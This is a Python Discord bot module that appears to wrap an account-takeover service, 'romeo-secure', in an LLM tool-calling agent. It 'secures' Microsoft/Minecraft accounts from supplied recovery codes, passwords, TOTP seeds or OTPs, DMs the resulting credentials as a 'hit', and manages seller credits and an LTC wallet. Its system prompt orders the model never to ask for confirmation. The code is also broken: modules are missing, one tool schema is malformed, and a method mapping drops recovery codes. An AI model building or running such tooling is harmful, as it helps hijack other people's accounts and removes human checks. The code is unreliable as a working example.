"""AI command — `/ai` — lets an owner run bot actions via natural language.

Example:
    /ai secure user@gmail.com with recovery code ABC123-DEF456
    /ai check balance
    /ai request otp for user@gmail.com
    /ai add 100 credits to @user

The AI provider (OpenAI-compatible) receives the prompt + a list of available
tool schemas, returns a JSON tool call, and we execute it.

Config in config/config.json → "ai" block:
    provider:    "openai" (only OpenAI-compatible for now)
    api_key:     YOUR_API_KEY
    api_url:     https://api.openai.com/v1/chat/completions
    model:       gpt-4o-mini
"""
import json
import asyncio
import httpx
import logging
import re
from discord import ApplicationContext, Embed, Colour, Option

rom = logging.getLogger(__name__)

CONFIG = json.load(open("config/config.json", "r"))
AI_CFG = CONFIG.get("ai", {})


class AIService:
    """Thin client for OpenAI-compatible chat completions with tool calls."""

    def __init__(self, cfg: dict | None = None):
        self.cfg = cfg or AI_CFG
        self.model = self.cfg.get("model", "gpt-4o-mini")
        self.api_key = self.cfg.get("api_key", "")
        self.api_url = self.cfg.get("api_url", "https://api.openai.com/v1/chat/completions")
        self.max_tokens = self.cfg.get("max_tokens", 2048)
        self.enabled = self.cfg.get("enabled", False)
        self.allowed = set(self.cfg.get("allowed_commands", []))
        self._rate_lock = asyncio.Lock()
        self._last_call: float = 0.0

    def _build_tools(self) -> list[dict]:
        """Tool schemas the AI can invoke — maps to available bot commands."""
        return [
            {
                "type": "function",
                "function": {
                    "name": "secure",
                    "description": "Secure a Microsoft account. Provide email and auth method.",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "email": {"type": "string", "description": "The Microsoft account email"},
                            "method": {"type": "string", "enum": ["rcvcode", "authpwd", "otp", "msauth"],
                                       "description": "rcvcode=email+recovery_code, authpwd=email+password+auth_secret (TOTP), otp=email+6-digit-code, msauth=email+password+auth_secret"},
                            "recovery_code": {"type": "string", "description": "16-char recovery code (no dashes)"},
                            "password": {"type": "string", "description": "Account password"},
                            "auth_secret": {"type": "string", "description": "Authenticator secret (TOTP seed)"},
                            "otp_code": {"type": "string", "description": "6-digit Microsoft OTP code from email"},
                            "mcign": {"type": "string", "description": "Minecraft username (optional)"},
                        },
                        "required": ["email", "method"],
                    },
                },
            },
            {
                "type": "function",
                "function": {
                    "name": "request_otp",
                    "description": "Request an OTP email code to a security email address.",
                    "parameters": {"type": "object", "properties": {"email": {"type": "string"}, "mcign": {"type": "string"}}, "required": ["email"]},
                },
            },
            {
                "type": "function",
                "name": "checkbalance",
                "description": "Check the seller's LTC wallet balance.",
                "parameters": {"type": "object", "properties": {}, "required": []},
            },
            {
                "type": "function",
                "function": {
                    "name": "addcredits",
                    "description": "Add credits to a Discord user.",
                    "parameters": {"type": "object", "properties": {"user_id": {"type": "string"}, "amount": {"type": "integer"}}, "required": ["user_id", "amount"]},
                },
            },
            {
                "type": "function",
                "function": {
                    "name": "removecredit",
                    "description": "Remove credits from a Discord user.",
                    "parameters": {"type": "object", "properties": {"user_id": {"type": "string"}, "amount": {"type": "integer"}}, "required": ["user_id", "amount"]},
                },
            },
        ]

    def _system_prompt(self) -> str:
        allowed = ", ".join(sorted(self.allowed)) if self.allowed else "all"
        return (
            "You are ollie's AI agent — a Discord bot assistant for the romeo-secure platform. "
            "You can run bot commands via natural language tool calls. "
            f"Allowed commands: {allowed}. "
            "When the user asks to secure an account, extract email + method + credentials "
            "and call `secure`. When they ask to check balance, call `checkbalance`. "
            "When they ask to add/remove credits, extract the user mention/ID and amount. "
            "Never ask for confirmation — just execute. "
            "If you lack required fields, ask the user for them."
        )

    async def ask(self, prompt: str, history: list[dict] | None = None) -> dict:
        """Send prompt + tools to the AI, return the first tool call (or text)."""
        if not self.enabled:
            return {"error": "AI is not enabled. Set ai.enabled=true in config/config.json"}

        if not self.api_key:
            return {"error": "AI api_key not set in config/config.json"}

        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json",
        }

        messages = [{"role": "system", "content": self._system_prompt()}]
        if history:
            messages.extend(history[-20:])
        messages.append({"role": "user", "content": prompt})

        payload = {
            "model": self.model,
            "messages": messages,
            "tools": self._build_tools(),
            "tool_choice": "auto",
            "max_tokens": self.max_tokens,
            "temperature": 0.2,
        }

        async with httpx.AsyncClient(timeout=30) as client:
            resp = await client.post(self.api_url, headers=headers, json=payload)
            data = resp.json()

        if resp.status_code != 200:
            return {"error": f"API error: {resp.status_code} — {data.get('error', {}).get('message', 'unknown')}"}

        choice = data.get("choices", [{}])[0]
        msg = choice.get("message", {})

        if msg.get("tool_calls"):
            tc = msg["tool_calls"][0]
            func_name = tc["function"]["name"]
            args = json.loads(tc["function"]["arguments"])
            return {"tool_call": {"name": func_name, "arguments": args}}

        return {"text": msg.get("content", "No response from AI")}

    async def rate_limit_wait(self):
        """Enforce rate limiting between calls."""
        import time
        async with self._rate_lock:
            now = time.monotonic()
            elapsed = now - self._last_call
            min_interval = 60.0 / max(self.cfg.get("rate_limit_per_minute", 10), 1)
            wait = min_interval - elapsed
            if wait > 0:
                await asyncio.sleep(wait)
            self._last_call = time.monotonic()


_ai_service: AIService | None = None


def get_ai_service() -> AIService:
    global _ai_service
    if _ai_service is None:
        _ai_service = AIService()
    return _ai_service


# ─── Tool Call Executors ─────────────────────────────────────────────────────


async def _run_secure_tool(args: dict, bot, ctx) -> str:
    """Execute the `secure` tool call by dispatching to the appropriate modal flow."""
    from authsecuring.recover import romeo_recover
    from authsecuring.embed_builder import build_account_embeds

    email = args.get("email", "")
    method_map = {
        "rcvcode": "rcode",
        "authpwd": "authpwd",
        "otp": "otp",
        "msauth": "msauth",
    }
    method = method_map.get(args.get("method", ""), args.get("method", ""))

    if not email or not method:
        return "Missing email or method for secure"

    data = {}
    if method in ("rcvcode",):
        data["recovery_code"] = args.get("recovery_code", "")
    if method in ("authpwd", "msauth"):
        data["password"] = args.get("password", "")
        data["auth_secret"] = args.get("auth_secret", "")
    if method == "otp":
        data["otp_code"] = args.get("otp_code", "")

    account = await romeo_recover(email=email, method=method, data=data)

    if isinstance(account, dict) and account.get("failed"):
        return f"Secure failed: {account.get('error', 'unknown error')}"

    if account == "invalid":
        return "Secure failed: invalid credentials"

    if not account:
        return "Secure failed: unknown error"

    # Build embeds and DM the user
    embeds = build_account_embeds(account)
    hit_eb = embeds.get("hit_embed") if isinstance(embeds, dict) else embeds

    try:
        await ctx.author.send(embed=hit_eb)
        return f"✅ Secured `{email}` — creds sent to your DMs"
    except Exception:
        return f"✅ Secured `{email}` but could not DM you"


async def _run_request_otp(args: dict, bot, ctx) -> str:
    email = args.get("email", "")
    if not email:
        return "Missing email for request_otp"

    from commands.request_otp import _request_otp_for
    await _request_otp_for(bot, email, ctx.author)
    return f"📧 OTP requested for `{email}`"


async def _run_checkbalance(args: dict, bot, ctx) -> str:
    from commands.checkbalance import get_wallet_balance
    from storage.romeo_db import RomeoDB

    with RomeoDB() as db:
        wallet = db.get_seller_wallet(ctx.author.id)

    usd, ltc, rate = get_wallet_balance(wallet)
    return f"💰 Balance: **${usd:.2f}** · **{ltc:.8f} LTC** · rate: **${rate:.2f}/LTC**"


async def _run_addcredits(args: dict, bot, ctx) -> str:
    user_id = args.get("user_id", "")
    amount = args.get("amount", 0)
    if not user_id or amount <= 0:
        return "Invalid user_id or amount"

    from storage.romeo_db import RomeoDB
    with RomeoDB() as db:
        db.add_credits(int(user_id), amount)
    return f"✅ Added {amount} credits to <@{user_id}>"


async def _run_removecredit(args: dict, bot, ctx) -> str:
    user_id = args.get("user_id", "")
    amount = args.get("amount", 0)
    if not user_id or amount <= 0:
        return "Invalid user_id or amount"

    from storage.romeo_db import RomeoDB
    with RomeoDB() as db:
        db.remove_credits(int(user_id), amount)
    return f"✅ Removed {amount} credits from <@{user_id}>"


_TOOL_EXECUTORS = {
    "secure": _run_secure_tool,
    "request_otp": _run_request_otp,
    "checkbalance": _run_checkbalance,
    "addcredits": _run_addcredits,
    "removecredit": _run_removecredit,
}


async def execute_tool_call(tool_name: str, args: dict, bot, ctx) -> str:
    executor = _TOOL_EXECUTORS.get(tool_name)
    if not executor:
        return f"Unknown tool: {tool_name}"
    return await executor(args, bot, ctx)


class AI(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @discord.slash_command(
        name="ai",
        description="Run bot actions via natural language (owner only)",
    )
    async def ai(
        self,
        ctx: ApplicationContext,
        prompt: Option(str, "What do you want me to do?", required=True),
    ):
        cfg = json.load(open("config/config.json", "r"))
        ai_cfg = cfg.get("ai", {})

        if not ai_cfg.get("enabled", False):
            await ctx.respond(
                embed=Embed(
                    title="AI not enabled",
                    description="Enable AI in `config/config.json` → `ai.enabled`.",
                    color=0xFA4343,
                ),
                ephemeral=True,
            )
            return

        bot_config = json.load(open("config/bot.json", "r"))
        aliases = bot_config.get("enabled_commands", {}).get("aliases", {})
        name = aliases.get("ai", "ai")

        # Check owner
        if ctx.author.id not in cfg.get("owners", []):
            await ctx.respond(
                embed=Embed(
                    title="Not allowed",
                    description="Only bot owners can use /ai.",
                    color=0xFA4343,
                ),
                ephemeral=True,
            )
            return

        await ctx.defer(ephemeral=True)

        svc = get_ai_service()
        await svc.rate_limit_wait()

        result = await svc.ask(prompt)

        if "error" in result:
            await ctx.followup.send(
                embed=Embed(
                    title="AI Error",
                    description=result["error"],
                    color=0xFA4343,
                ),
                ephemeral=True,
            )
            return

        if "text" in result:
            await ctx.followup.send(
                embed=Embed(
                    title="AI Response",
                    description=result["text"][:2000],
                    color=0x5865F2,
                ),
                ephemeral=True,
            )
            return

        # Tool call
        tc = result["tool_call"]
        tool_name = tc["name"]
        args = tc["arguments"]

        await ctx.followup.send(
            embed=Embed(
                title="Running AI command",
                description=f"**{tool_name}** — {json.dumps(args, indent=2)[:500]}",
                color=0x57F287,
            ),
            ephemeral=True,
        )

        outcome = await execute_tool_call(tool_name, args, self.bot, ctx)

        await ctx.followup.send(
            embed=Embed(
                title="✅ Done",
                description=outcome,
                color=0x57F287,
            ),
            ephemeral=True,
        )


def setup(bot: commands.Bot) -> None:
    bot.add_cog(AI(bot))
